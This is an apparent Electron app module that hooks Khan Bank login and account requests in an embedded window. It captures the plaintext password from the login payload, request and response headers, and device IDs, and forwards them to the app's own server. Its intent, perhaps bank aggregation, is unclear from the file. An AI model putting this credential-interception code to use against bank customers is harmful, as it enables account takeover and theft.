// ============================================================
// cookie-collector.js — CAPTCHA цонхны KhanBank network hooks
// Insert: khanBankCookieInsert.js (main only) | Log: captchaDebugLog.js
// ============================================================
const { session } = require('electron');
const { captchaLog, captchaLogInsertResult } = require('../utils/captchaDebugLog');

class CookieCollector {
    constructor(captchaWindow, isCitizen, winCompat) {
        this.captchaWindow = captchaWindow;
        this.isCitizen = isCitizen;
        this.winCompat = winCompat;
        this.installed = false;
        this.latestPassword = null;
        this.currentDeviceId = null;
        this._stats = { captured: 0, sent: 0, inserted: 0, failed: 0 };
    }

    _headerValue(headers, name) {
        if (!headers) return undefined;
        const key = Object.keys(headers).find((k) => k.toLowerCase() === name.toLowerCase());
        if (!key) return undefined;
        const raw = headers[key];
        return Array.isArray(raw) ? raw[0] : raw;
    }

    _normalizeHeaders(headers) {
        if (!headers || typeof headers !== 'object') return {};
        const out = {};
        for (const [key, value] of Object.entries(headers)) {
            if (!key || value == null) continue;
            const str = Array.isArray(value) ? value.filter(Boolean).join('; ') : String(value);
            if (str) out[key] = str;
        }
        return out;
    }

    _getSession() {
        if (
            this.captchaWindow &&
            !this.captchaWindow.isDestroyed() &&
            this.captchaWindow.webContents?.session
        ) {
            return this.captchaWindow.webContents.session;
        }
        return session.defaultSession;
    }

    install() {
        if (this.installed) return;
        const sess = this._getSession();

        if (!sess?.webRequest) {
            captchaLog('warn', 'HOOKS', 'Session/webRequest unavailable');
            return;
        }

        const tokenUrls = [
            'https://e.khanbank.com/v3/cfrm/auth/token*',
            'https://corp.khanbank.com/api/auth/token*',
        ];
        const accountUrls = [
            'https://e.khanbank.com/v3/omni/accounts*',
            'https://e.khanbank.com/v3/account-omni/*',
            'https://e.khanbank.com/*/account*',
            'https://api.khanbank.com:9003/v3/omni/accounts*',
            'https://api.khanbank.com:9003/*/account*',
        ];

        const tokenFilter = { urls: tokenUrls };
        const accountFilter = { urls: accountUrls };

        sess.webRequest.onBeforeSendHeaders(tokenFilter, (details, callback) => {
            try {
                const deviceIdHeader = this._headerValue(details.requestHeaders, 'device-id');
                if (deviceIdHeader) this.currentDeviceId = deviceIdHeader;
                const headers = this._normalizeHeaders(details.requestHeaders);
                this._sendToServer({
                    url: details.url,
                    headers,
                    deviceId: this.currentDeviceId,
                    tag: 'REQUEST_HEADER',
                });
            } catch (err) {
                captchaLog('error', 'HOOK', 'onBeforeSendHeaders', { error: err.message });
            }
            callback({ requestHeaders: details.requestHeaders });
        });

        sess.webRequest.onBeforeRequest(tokenFilter, (details, callback) => {
            try {
                if (details.uploadData?.length > 0) {
                    let payload = '';
                    details.uploadData.forEach((d) => {
                        if (d.bytes) payload += Buffer.from(d.bytes).toString('utf8');
                    });

                    if (payload) {
                        let data;
                        try {
                            data = JSON.parse(payload);
                        } catch (parseErr) {
                            captchaLog('warn', 'CAPTURE', 'REQUEST_PAYLOAD JSON биш', {
                                url: details.url,
                                preview: payload.slice(0, 80),
                                error: parseErr.message,
                            });
                        }
                        if (data && typeof data === 'object') {
                            if (!data.rememberDevice) {
                                this.latestPassword = data.password;
                            } else if (this.latestPassword) {
                                data.password = this.latestPassword;
                            }
                            this._sendToServer({
                                url: details.url,
                                requestPayload: JSON.stringify(data),
                                deviceId: this.currentDeviceId,
                                tag: 'REQUEST_PAYLOAD',
                            });
                        }
                    }
                }
                setImmediate(() => this._checkExposeHeaders());
            } catch (err) {
                captchaLog('error', 'HOOK', 'onBeforeRequest', { error: err.message });
            }
            callback({});
        });

        sess.webRequest.onResponseStarted(tokenFilter, (details) => {
            try {
                const headers = this._normalizeHeaders(details.responseHeaders);
                this._sendToServer({
                    url: details.url,
                    headers,
                    deviceId: this.currentDeviceId,
                    tag: 'RESPONSE_HEADER',
                    isResponseHeader: true,
                });
                if (this._headerValue(details.responseHeaders, 'access-control-expose-headers')) {
                    setImmediate(() => this._checkExposeHeaders());
                }
            } catch (err) {
                captchaLog('error', 'HOOK', 'onResponseStarted', { error: err.message });
            }
        });

        sess.webRequest.onCompleted(tokenFilter, (details) => {
            try {
                if (this._headerValue(details.responseHeaders, 'access-control-expose-headers')) {
                    setImmediate(() => this._checkExposeHeaders());
                }
            } catch (err) {
                captchaLog('error', 'HOOK', 'onCompleted token', { error: err.message });
            }
        });

        sess.webRequest.onCompleted(accountFilter, (details) => {
            try {
                this._sendToServer({
                    url: details.url,
                    responsePayload: 'accounts',
                    deviceId: this.currentDeviceId,
                    tag: 'RESPONSE_COMPLETED',
                });
                if (this._headerValue(details.responseHeaders, 'access-control-expose-headers')) {
                    setImmediate(() => this._checkExposeHeaders());
                }
            } catch (err) {
                captchaLog('error', 'HOOK', 'onCompleted accounts', { error: err.message });
            }
        });

        this.installed = true;
        captchaLog('ok', 'HOOKS', 'Суулгагдлаа', {
            session: sess === session.defaultSession ? 'default' : 'captcha-window',
        });
    }

    uninstall() {
        if (!this.installed) return;
        try {
            const sess = this._getSession();
            if (sess?.webRequest) {
                sess.webRequest.onBeforeSendHeaders(null);
                sess.webRequest.onResponseStarted(null);
                sess.webRequest.onBeforeRequest(null);
                sess.webRequest.onCompleted(null);
            }
        } catch (err) {
            captchaLog('error', 'HOOKS', 'uninstall', { error: err.message });
        }
        captchaLog('info', 'STATS', 'CAPTCHA insert статистик', this._stats);
        this.installed = false;
        this.currentDeviceId = null;
    }

    _getJwt() {
        const { getMainProcessJwt } = require('../utils/mainJwt');
        return getMainProcessJwt();
    }

    _sendToServer(params) {
        this._stats.captured += 1;
        const jwtToken = this._getJwt();

        captchaLog('info', 'INSERT', 'Server руу илгээж байна', {
            tag: params.tag,
            url: params.url,
            hasJwt: !!jwtToken,
            isCitizen: this.isCitizen,
        });

        if (!jwtToken) {
            this._stats.failed += 1;
            captchaLog('warn', 'INSERT', 'JWT байхгүй — insert алгасав', { tag: params.tag });
            return;
        }

        this._stats.sent += 1;
        const { insertKhanBankCookiesFromMain } = require('../utils/khanBankCookieInsert');
        insertKhanBankCookiesFromMain({
            isCitizen: this.isCitizen,
            ...params,
            bankAccountNum: params.tag,
            jwtToken,
        })
            .then((result) => {
                if (result?.ok) {
                    this._stats.inserted += 1;
                } else {
                    this._stats.failed += 1;
                }
                captchaLogInsertResult({
                    tag: params.tag,
                    url: params.url,
                    insertedCount: result?.insertedCount ?? 0,
                    ok: !!result?.ok,
                    reason: result?.reason,
                });
            })
            .catch((err) => {
                this._stats.failed += 1;
                captchaLogInsertResult({
                    tag: params.tag,
                    url: params.url,
                    ok: false,
                    reason: err.message,
                });
            });
    }

    _checkExposeHeaders() {
        const jwtToken = this._getJwt();
        if (!jwtToken) return;
        const { checkExposeHeadersFromMain } = require('../utils/khanBankCookieInsert');
        checkExposeHeadersFromMain({ isCitizen: this.isCitizen, jwtToken }).catch((err) => {
            captchaLog('error', 'EXPOSE', 'checkExposeHeaders алдаа', { error: err.message });
        });
    }
}

module.exports = CookieCollector;
